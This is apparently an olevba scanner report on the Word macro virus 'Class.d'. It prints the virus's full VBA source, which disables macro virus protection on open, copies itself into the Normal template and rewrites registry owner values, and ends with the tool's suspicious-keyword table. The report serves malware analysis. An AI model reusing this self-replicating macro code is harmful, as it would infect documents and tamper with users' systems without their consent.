olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-3eaffbd63a4c3ba68a3bdcf57d03f8583b4d7ab3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-3eaffbd63a4c3ba68a3bdcf57d03f8583b4d7ab3 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'O.B.1. Canobi3/7/99 5:37:49 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'O.B.1. Canobi3/7/99 5:37:49 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'O.B.1. Canobi3/7/99 5:37:49 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
Const REG_SZ As Long = 1
'O.B.1. Canobi3/7/99 5:37:49 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
Const HKEY_CURRENT_USER As Long = &H80000001
'O.B.1. Canobi3/7/99 5:37:49 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'O.B.1. Canobi3/7/99 5:37:49 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
Sub AutoOpen()
'O.B.1. Canobi3/7/99 5:37:49 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
On Error GoTo out
'O.B.1. Canobi3/7/99 5:37:49 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
Options.VirusProtection = False
'O.B.1. Canobi3/7/99 5:37:49 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
Options.SaveNormalPrompt = False
'O.B.1. Canobi3/7/99 5:37:49 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
Options.ConfirmConversions = False
'O.B.1. Canobi3/7/99 5:37:49 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'O.B.1. Canobi3/7/99 5:37:49 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'O.B.1. Canobi3/7/99 5:37:49 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
If nt > 70 And ad > 0 Then GoTo out
'O.B.1. Canobi3/7/99 5:37:49 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
If nt < 70 Then
'O.B.1. Canobi3/7/99 5:37:49 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'O.B.1. Canobi3/7/99 5:37:49 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
End If
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
host.codemodule.AddFromFile ("c:\class.sys")
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
With host.codemodule
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
    For x = 1 To 16
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
    .deletelines 1
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
    Next x
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
End With
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
If nt < 70 Then
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
    With host.codemodule
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
    .replaceline 1, "Sub AutoClose()"
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
    .replaceline 91, "Sub ToolsMacro()"
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
    For x = 70 To 81
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
        .deletelines 62
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
    Next x
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
    .replaceline 35, "    For x = 1 To 4"
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
    End With
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
End If
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
If nt < 70 Then
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
u = RegCloseKey(k)
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
End If
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
With host.codemodule
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
    For x = 2 To 104 Step 2
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
    Next x
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
End With
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
out:
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
End Sub
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
Sub ViewVBCode()
'O.B.1. Canobi3/7/99 5:37:50 PMHP LaserJet 6L (PCL) on \\WSTATIN10\HPIndia  2
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

